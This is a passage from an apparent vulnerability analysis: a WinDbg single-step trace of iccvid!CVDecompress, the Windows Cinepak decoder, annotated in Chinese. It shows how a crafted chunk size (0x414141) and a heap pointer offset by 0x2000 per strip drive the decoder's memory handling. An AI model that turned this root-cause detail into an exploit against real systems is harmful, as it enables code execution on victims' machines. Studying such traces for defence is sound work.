class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00002000</span> <span class="comment">; eax = 0x001555f8,堆块数据区域指针增加0x2000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001555f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722dd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x12f</span>:</span><br><span class="line">73b722dd 8d4e0c          <span class="keyword">lea</span>     <span class="built_in">ecx</span>,[<span class="built_in">esi</span>+<span class="number">0Ch</span>]                                  <span class="comment">; ecx = esi+0xC = 0x00ba691e,指向第2个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001555f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722e0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x132</span>:</span><br><span class="line">73b722e0 <span class="number">894338</span>          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">38h</span>],<span class="built_in">eax</span> <span class="built_in">ds</span>:<span class="number">0023</span>:001535e8=001535f8 <span class="comment">; [ebx+38h] = eax = 0x001555f8,堆块数据区域指针增加0x2000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001555f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722e3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x135</span>:</span><br><span class="line">73b722e3 8b4520          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd50=<span class="number">00000540</span> <span class="comment">; eax = a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722e6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x138</span>:</span><br><span class="line">73b722e6 894de8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba6912 <span class="comment">; [ebp-18h] = ecx = 00ba691e,指向第2个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722e9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13b</span>:</span><br><span class="line">73b722e9 89433c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">3Ch</span>],<span class="built_in">eax</span> <span class="built_in">ds</span>:<span class="number">0023</span>:001535ec=<span class="number">00000540</span> <span class="comment">; ebx = a1 = 0x001535b0,[ebx+3Ch] = eax = a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722ec <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13e</span>:</span><br><span class="line">73b722ec e9be000000      <span class="keyword">jmp</span>     iccvid!CVDecompress+<span class="number">0x201</span> (73b723af)           <span class="comment">; </span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723af <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x201</span>:</span><br><span class="line">73b723af 837d0804        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">4</span>  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; 判断Size of strip data减去Strip Header大小后的数据大小是否大于等于4</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723b3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x205</span>:</span><br><span class="line">73b723b3 0f8338ffffff    <span class="keyword">jae</span>     iccvid!CVDecompress+<span class="number">0x143</span> (73b722f1)    [br=<span class="number">1</span>] <span class="comment">; 大于等于则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722f1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x143</span>:</span><br><span class="line">73b722f1 0fb64103        <span class="keyword">movzx</span>   <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6921=<span class="number">41</span> <span class="comment">; ecx = 0x00ba691e,指向第2个CVID Chunk ID,eax = 0x41,Size of chunk data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722f5 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x147</span>:</span><br><span class="line">73b722f5 33d2            <span class="keyword">xor</span>     <span class="built_in">edx</span>,<span class="built_in">edx</span>                                        <span class="comment">; edx = edx^edx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722f7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x149</span>:</span><br><span class="line">73b722f7 8a7101          <span class="keyword">mov</span>     <span class="number">dh</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba691f=<span class="number">41</span> <span class="comment">; dh = 0x41,第2个CVID Chunk ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00004100</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722fa <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x14c</span>:</span><br><span class="line">73b722fa 8a5102          <span class="keyword">mov</span>     <span class="built_in">dl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6920=<span class="number">41</span> <span class="comment">; dl = 0x41,Size of chunk data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00004141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722fd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x14f</span>:</span><br><span class="line">73b722fd c1e208          <span class="keyword">shl</span>     <span class="built_in">edx</span>,<span class="number">8</span>                                          <span class="comment">; edx = 0x00414100,左移8位</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414100</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b72300 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x152</span>:</span><br><span class="line">73b72300 0bd0            <span class="keyword">or</span>      <span class="built_in">edx</span>,<span class="built_in">eax</span>                                        <span class="comment">; 以大端读取Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b72302 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x154</span>:</span><br><span class="line">73b72302 <span class="number">395508</span>          <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="built_in">edx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; 判断Size of strip data减去Strip Header大小后的数据大小是否小于Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b72305 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000287</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x157</span>:</span><br><span class="line">73b72305 8955e0          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">20h</span>],<span class="built_in">edx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd10=<span class="number">00000000</span> <span class="comment">; [ebp-20h] = edx = 0x00414141,Size of chunk data</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b72308 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000287</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x15a</span>:</span><br><span class="line">73b72308 0f82ab000000    <span class="keyword">jb</span>      iccvid!CVDecompress+<span class="number">0x20b</span> (73b723b9)    [br=<span class="number">1</span>] <span class="comment">; 小于则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723b9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000287</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x20b</span>:</span><br><span class="line">73b723b9 0fbf450c        <span class="keyword">movsx</span>   <span class="built_in">eax</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">0Ch</span>]   <span class="built_in">ss</span>:<span class="number">0023</span>:025afd3c=<span class="number">0000</span> <span class="comment">; eax = a2 = 0x0000 = (Strips bottom Y position)-(Strips top Y position)</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723bd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei ng nz na pe cy</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000287</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x20f</span>:</span><br><span class="line">73b723bd 0faf4520        <span class="keyword">imul</span>    <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd50=<span class="number">00000540</span> <span class="comment">; eax = 0x00000000,a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x213</span>:</span><br><span class="line">73b723c1 01451c          <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">1Ch</span>],<span class="built_in">eax</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd4c=0232f850 <span class="comment">; [(Strips bottom Y position)-(Strips top Y position)]*a7+a6,a6 = 0x0232f850</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723c4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x216</span>:</span><br><span class="line">73b723c4 ff45ec          <span class="keyword">inc</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">14h</span>]  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd1c=<span class="number">00000001</span> <span class="comment">; [ebp-14h]++,coded strip计数器,[ebp-14h] = 0x2</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723c7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x219</span>:</span><br><span class="line">73b723c7 8145fc00200000  <span class="keyword">add</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>],<span class="number">2000h</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00002000</span> <span class="comment">; [ebp-4] = [ebp-4]+0x2000 = 0x4000,堆缓冲区指针偏移</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723ce <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x220</span>:</span><br><span class="line">73b723ce 33ff            <span class="keyword">xor</span>     <span class="built_in">edi</span>,<span class="built_in">edi</span>                                        <span class="comment">; edi = edi^edi = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00414141</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span 